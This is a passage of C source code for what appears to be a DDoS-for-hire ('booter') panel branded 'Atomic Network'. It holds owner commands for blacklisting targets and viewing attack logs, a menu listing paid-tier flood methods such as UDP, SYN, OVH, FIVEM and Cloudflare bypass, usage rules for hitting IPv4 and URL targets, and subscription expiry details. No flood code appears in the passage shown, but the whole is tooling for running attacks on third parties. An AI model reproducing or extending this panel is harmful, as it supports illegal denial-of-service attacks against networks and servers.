						FILE *BLip = fopen("/root/Logs/BlackListed.txt", "a+");
						fprintf(BLip, "%s\r\n", Args[1]);
						fclose(BLip);
					}
					else
					{
						socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
						socketWrite(datafd, Args[1]);
						socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
					}

					socketWrite(datafd, "\x1b[38;5;082mIP \x1b[38;5;015m[\e[38;2;255;244;0m");
					socketWrite(datafd, Args[1]);
					socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mHas been black-listed!\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "BLURL") || strjcmp(Args[0], "blurl"))
			{
				if (Users[datafd].ownerstatus == 1)
				{

					FILE *BLurl = fopen("/root/Logs/BlackListed.txt", "a+");
					fprintf(BLurl, "%s\r\n", Args[1]);
					fclose(BLurl);

					socketWrite(datafd, "\x1b[38;5;082mURL \x1b[38;5;015m[\e[38;2;255;244;0m");
					socketWrite(datafd, Args[1]);
					socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mHas been black-listed!\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "ATKS") || strjcmp(Args[0], "atks"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					char *fileLog = "/root/Logs/Attacks.txt";
					char logView[0x100];

					snprintf(logView, sizeof(logView), fileLog);
					trim(logView);

					FILE *atkLog;

					char *line = NULL;
					size_t length = 0;
					ssize_t read;

					atkLog = fopen(logView, "a+");

					if (atkLog == NULL)
					{
						socketWrite(datafd, "\e[38;2;255;0;0mAttack Logs \e[38;2;255;0;230m[\e[38;2;0;255;60mBROKEN\e[38;2;255;0;230m]\n");
						continue;
					}

					socketWrite(datafd, "\x1b\e[0m\n");

					while ((read = getline(&line, &length, atkLog)) != -1)
					{
						socketWrite(datafd, "\e[38;2;255;0;0m");
						socketWrite(datafd, line);
					}

					socketWrite(datafd, "\x1b\e[0m\r\n");
					free(line);
					fclose(atkLog);

					FILE *adminLog = fopen("/root/Logs/AdminLog.txt", "a+");
					fprintf(adminLog, "User: [%s] with [%s] status has preformed a Attack View Log Command!\n", Users[datafd].username, accounts[FileLogin].status);
					fclose(adminLog);
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}

			else if (strjcmp(Args[0], "FCAP") || strjcmp(Args[0], "fcap"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					char *fileLog = "/root/Logs/FailedCaptcha.txt";
					char logView[0x100];

					snprintf(logView, sizeof(logView), fileLog);
					trim(logView);

					FILE *fcapLog;

					char *line = NULL;
					size_t length = 0;
					ssize_t read;

					fcapLog = fopen(logView, "a+");

					if (fcapLog == NULL)
					{
						socketWrite(datafd, "\e[38;2;255;0;0mFailed Captcha Logs \e[38;2;255;0;230m[\e[38;2;0;255;60mBROKEN\e[38;2;255;0;230m]\n");
						continue;
					}

					socketWrite(datafd, "\x1b\e[0m\n");

					while ((read = getline(&line, &length, fcapLog)) != -1)
					{
						socketWrite(datafd, "\e[38;2;255;0;0m");
						socketWrite(datafd, line);
					}

					socketWrite(datafd, "\x1b\e[0m\r\n");
					free(line);
					fclose(fcapLog);

					FILE *adminLog = fopen("/root/Logs/AdminLog.txt", "a+");
					fprintf(adminLog, "User: [%s] with [%s] status has preformed a Failed Captcha View Log Command!\n", Users[datafd].username, accounts[FileLogin].status);
					fclose(adminLog);
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "BLLOG") || strjcmp(Args[0], "bllog"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					char *fileLog = "/root/Logs/BlackListed.txt";
					char logView[0x100];

					snprintf(logView, sizeof(logView), fileLog);
					trim(logView);

					FILE *blLog;

					char *line = NULL;
					size_t length = 0;
					ssize_t read;

					blLog = fopen(logView, "a+");

					if (blLog == NULL)
					{
						socketWrite(datafd, "\e[38;2;255;0;0mBlack-List Logs \e[38;2;255;0;230m[\e[38;2;0;255;60mBROKEN\e[38;2;255;0;230m]\n");
						continue;
					}

					socketWrite(datafd, "\x1b\e[0m\n");

					while ((read = getline(&line, &length, blLog)) != -1)
					{
						socketWrite(datafd, "\e[38;2;255;0;0m");
						socketWrite(datafd, line);
					}

					socketWrite(datafd, "\x1b\e[0m\r\n");
					free(line);
					fclose(blLog);

					FILE *adminLog = fopen("/root/Logs/AdminLog.txt", "a+");
					fprintf(adminLog, "User: [%s] with [%s] status has preformed a Black-List Log Command!\n", Users[datafd].username, accounts[FileLogin].status);
					fclose(adminLog);
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "methods") || strjcmp(Args[0], "METHODS"))
			{
				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "                         \e[38;2;0;255;73m╔\e[38;2;0;255;64m╦\e[38;2;6;243;73m╗ \e[38;2;20;219;91m╔\e[38;2;27;207;100m═\e[38;2;34;195;109m╗ \e[38;2;48;170;127m╔\e[38;2;54;158;136m╦\e[38;2;61;146;145m╗ \e[38;2;75;122;164m╦ \e[38;2;89;98;182m╦ \e[38;2;102;73;200m╔\e[38;2;109;61;209m═\e[38;2;116;49;218m╗ \e[38;2;130;25;236m╔\e[38;2;137;13;245m╦\e[38;2;144;0;255m╗ \e[38;2;154;0;231m╔\e[38;2;159;0;219m═\e[38;2;165;0;207m╗\e[0m\r\n");
				socketWrite(datafd, "                         \e[38;2;0;255;73m║\e[38;2;0;255;64m║\e[38;2;6;243;73m║ \e[38;2;20;219;91m║\e[38;2;27;207;100m╣   \e[38;2;54;158;136m║  \e[38;2;75;122;164m╠\e[38;2;82;110;173m═\e[38;2;89;98;182m╣ \e[38;2;102;73;200m║ \e[38;2;116;49;218m║  \e[38;2;137;13;245m║\e[38;2;144;0;255m║ \e[38;2;154;0;231m╚\e[38;2;159;0;219m═\e[38;2;165;0;207m╗\e[0m\r\n");
				socketWrite(datafd, "                         \e[38;2;0;255;73m╩ \e[38;2;6;243;73m╩ \e[38;2;20;219;91m╚\e[38;2;27;207;100m═\e[38;2;34;195;109m╝  \e[38;2;54;158;136m╩  \e[38;2;75;122;164m╩ \e[38;2;89;98;182m╩ \e[38;2;102;73;200m╚\e[38;2;109;61;209m═\e[38;2;116;49;218m╝ \e[38;2;130;25;236m═\e[38;2;137;13;245m╩\e[38;2;144;0;255m╝ \e[38;2;154;0;231m╚\e[38;2;159;0;219m═\e[38;2;165;0;207m╝\e[0m\r\n");
				socketWrite(datafd, "            \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
				socketWrite(datafd, "           \e[38;2;0;255;189m╔\e[38;2;0;255;180m═\e[38;2;0;255;172m═\e[38;2;0;255;164m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m═\e[38;2;233;0;49m═\e[38;2;239;0;37m═\e[38;2;244;0;25m═\e[38;2;244;0;25m═\e[38;2;249;0;13m╗\e[0m\r\n");

				socketWrite(datafd, "              \e[38;2;255;0;166m  BASIC          \e[38;2;255;0;166mVIP           \e[38;2;255;0;166mFMP           \e[38;2;255;0;166mRAW\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m═\e[38;2;0;255;172m═\e[38;2;0;255;164m╦\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m╦\e[38;2;0;255;98m═\e[38;2;0;255;89m═  \e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m╦\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m╦\e[38;2;68;134;154m═\e[38;2;75;122;164m═  \e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m╦\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╦\e[38;2;159;0;219m═\e[38;2;165;0;207m═  \e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m╦\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m╦\e[38;2;233;0;49m═\e[38;2;239;0;37m═\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m╔\e[38;2;0;255;172m═\e[38;2;0;255;164m╩\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m╩\e[38;2;0;255;98m═\e[38;2;0;255;89m╗  \e[38;2;0;255;64m╔\e[38;2;6;243;73m═\e[38;2;13;231;82m╩\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m╩\e[38;2;68;134;154m═\e[38;2;75;122;164m╗  \e[38;2;96;85;191m╔\e[38;2;102;73;200m═\e[38;2;109;61;209m╩\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m╩\e[38;2;159;0;219m═\e[38;2;165;0;207m╗  \e[38;2;181;0;170m╔\e[38;2;186;0;158m═\e[38;2;191;0;146m╩\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m╩\e[38;2;233;0;49m═\e[38;2;239;0;37m╗\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m UDP      \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m FIVEM    \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m CYBER    \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m UDP1     \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m TCP      \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m SYN      \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m CLIMAX   \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m XTD      \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m OVH      \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m CLOUDF   \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m HYPER    \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m SOCK     \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m NFO      \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m CONS     \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m WHOST    \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m RAND     \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m GAME     \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m          \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m LABIXE   \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m NFO1     \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m║\e[38;2;0;255;128m HTTPS    \e[38;2;0;255;89m║  \e[38;2;0;255;64m║\e[38;2;0;229;255m          \e[38;2;75;122;164m║  \e[38;2;96;85;191m║\e[38;2;230;0;255m          \e[38;2;165;0;207m║  \e[38;2;181;0;170m║\e[38;2;255;0;43m VSE      \e[38;2;239;0;37m║\e[0m\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;180m╚\e[38;2;0;255;172m═\e[38;2;0;255;164m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m╝  \e[38;2;0;255;64m╚\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m╝  \e[38;2;96;85;191m╚\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m╝  \e[38;2;181;0;170m╚\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m═\e[38;2;233;0;49m═\e[38;2;239;0;37m╝\e[0m\r\n");
				socketWrite(datafd, "           \e[38;2;0;255;189m╚\e[38;2;0;255;180m═\e[38;2;0;255;172m═\e[38;2;0;255;164m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;139m═\e[38;2;0;255;131m═\e[38;2;0;255;122m═\e[38;2;0;255;114m═\e[38;2;0;255;106m═\e[38;2;0;255;98m═\e[38;2;0;255;89m═\e[38;2;0;255;81m═\e[38;2;0;255;73m═\e[38;2;0;255;64m═\e[38;2;6;243;73m═\e[38;2;13;231;82m═\e[38;2;20;219;91m═\e[38;2;27;207;100m═\e[38;2;34;195;109m═\e[38;2;41;183;118m═\e[38;2;48;170;127m═\e[38;2;54;158;136m═\e[38;2;61;146;145m═\e[38;2;68;134;154m═\e[38;2;75;122;164m═\e[38;2;82;110;173m═\e[38;2;89;98;182m═\e[38;2;96;85;191m═\e[38;2;102;73;200m═\e[38;2;109;61;209m═\e[38;2;116;49;218m═\e[38;2;123;37;227m═\e[38;2;130;25;236m═\e[38;2;137;13;245m═\e[38;2;144;0;255m═\e[38;2;149;0;243m═\e[38;2;154;0;231m═\e[38;2;159;0;219m═\e[38;2;165;0;207m═\e[38;2;170;0;195m═\e[38;2;175;0;183m═\e[38;2;181;0;170m═\e[38;2;186;0;158m═\e[38;2;191;0;146m═\e[38;2;196;0;134m═\e[38;2;202;0;122m═\e[38;2;207;0;110m═\e[38;2;212;0;98m═\e[38;2;218;0;85m═\e[38;2;223;0;73m═\e[38;2;228;0;61m═\e[38;2;233;0;49m═\e[38;2;239;0;37m═\e[38;2;244;0;25m═\e[38;2;244;0;25m═\e[38;2;249;0;13m╝\e[0m\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "rules") || strjcmp(Args[0], "RULES"))
			{
				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;119m╦\e[38;2;0;255;110m═\e[38;2;0;255;101m╗ \e[38;2;0;255;83m╦ \e[38;2;0;255;64m╦ \e[38;2;15;229;84m╦   \e[38;2;45;175;124m╔\e[38;2;53;162;134m═\e[38;2;60;148;144m╗ \e[38;2;75;121;164m╔\e[38;2;83;108;174m═\e[38;2;90;94;184m╗  \e[38;2;113;54;214m╔\e[38;2;121;41;224m╦\e[38;2;128;27;234m╗ \e[38;2;144;0;255m╔\e[38;2;149;0;242m═\e[38;2;155;0;229m╗ \e[38;2;167;0;202m╔\e[38;2;173;0;188m╗\e[38;2;179;0;175m╔ \e[38;2;190;0;148m╦ \e[38;2;202;0;121m╦\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;119m╠\e[38;2;0;255;110m╦\e[38;2;0;255;101m╝ \e[38;2;0;255;83m║ \e[38;2;0;255;64m║ \e[38;2;15;229;84m║   \e[38;2;45;175;124m║\e[38;2;53;162;134m╣  \e[38;2;75;121;164m╚\e[38;2;83;108;174m═\e[38;2;90;94;184m╗  \e[38;2;113;54;214m║\e[38;2;121;41;224m║\e[38;2;128;27;234m║ \e[38;2;144;0;255m║\e[38;2;149;0;242m╣  \e[38;2;167;0;202m║\e[38;2;173;0;188m║\e[38;2;179;0;175m║ \e[38;2;190;0;148m║ \e[38;2;202;0;121m║\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;119m╩\e[38;2;0;255;110m╚\e[38;2;0;255;101m═ \e[38;2;0;255;83m╚\e[38;2;0;255;74m═\e[38;2;0;255;64m╝ \e[38;2;15;229;84m╩\e[38;2;22;215;94m═\e[38;2;30;202;104m╝ \e[38;2;45;175;124m╚\e[38;2;53;162;134m═\e[38;2;60;148;144m╝ \e[38;2;75;121;164m╚\e[38;2;83;108;174m═\e[38;2;90;94;184m╝  \e[38;2;113;54;214m╩ \e[38;2;128;27;234m╩ \e[38;2;144;0;255m╚\e[38;2;149;0;242m═\e[38;2;155;0;229m╝ \e[38;2;167;0;202m╝\e[38;2;173;0;188m╚\e[38;2;179;0;175m╝ \e[38;2;190;0;148m╚\e[38;2;196;0;135m═\e[38;2;202;0;121m╝\r\n");
				socketWrite(datafd, "             \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
				socketWrite(datafd, "            \e[38;2;0;255;220m╔\e[38;2;0;255;211m═\e[38;2;0;255;202m═\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╦\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m╦\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m══╗\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m╔\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╩\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m╩\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╗\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT hit/redirect govermental IPS/URL \e[38;2;255;0;0m[FORBIDEN]\e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT \e[38;2;255;0;0mspam attacks on [Atomic Network]           \e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT \e[38;2;255;0;0mdump [Atomic Network METHODS]              \e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mSTRICTLY go by \e[38;2;255;0;0mIPv4 > L4 & VIP | URL > L7         \e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT share your login credentials \e[38;2;255;0;0m[FORBIDEN]    \e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT try to \e[38;2;255;0;0mexploit/crash [Atomic Network]      \e[38;2;249;0;14m║\r\n");
				socketWrite(datafd, "              \e[38;2;0;255;202m╚\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m═\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╝\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "credits") || strjcmp(Args[0], "CREDITS"))
			{
				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mSource\e[38;2;255;145;0m: \e[38;2;255;247;0mAtomic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mOwner\e[38;2;255;145;0m: \e[38;2;255;247;0mAtomic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mMade by\e[38;2;255;145;0m: \e[38;2;255;247;0mAtomic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mWritten in\e[38;2;255;145;0m: \e[38;2;255;247;0mC\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mVersion\e[38;2;255;145;0m: \e[38;2;255;247;0m3.0.0\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mRelease\e[38;2;255;145;0m: \e[38;2;255;247;0m10/06/2022\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mAtomic Network Team \e[38;2;255;145;0m[\e[38;2;255;247;0mOwners: \e[38;2;255;0;0mAtomic | Za\e[38;2;255;145;0m] [\e[38;2;255;247;0mAdmins: \e[38;2;255;0;0mvSync\e[38;2;255;145;0m]\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "profile") || strjcmp(Args[0], "PROFILE"))
			{
				struct tm dateFormat = *localtime(&Users[datafd].expiry);
				char expiryBuffer[100];

				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");

				socketWrite(datafd, "\e[38;2;255;0;234mUsername: \e[38;2;255;0;0m");
				socketWrite(datafd, accounts[FileLogin].username);

				socketWrite(datafd, "\r\n\e[38;2;255;0;234mPassword: \e[38;2;255;0;0mxxxxxx");

				socketWrite(datafd, "\r\n\e[38;2;255;0;234mStatus Type: \e[38;2;255;0;0m");
				socketWrite(datafd, accounts[FileLogin].status);

				socketWrite(datafd, "\r\n\e[38;2;255;0;234mSeconds: \e[38;2;255;0;0m");
				socketWrite(datafd, accounts[FileLogin].secs);

				strftime(expiryBuffer, sizeof(expiryBuffer), "%a - %d/%m - %H:%M:%S", &dateFormat);

				socketWrite(datafd, "\r\n\e[38;2;255;0;234mExpiry: \e[38;2;255;0;0m");
				socketWrite(datafd, expiryBuffer);

				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\r\n\e[38;2;255;0;0mIf you would like to update your plan, please message Owners/Admins\r\n");
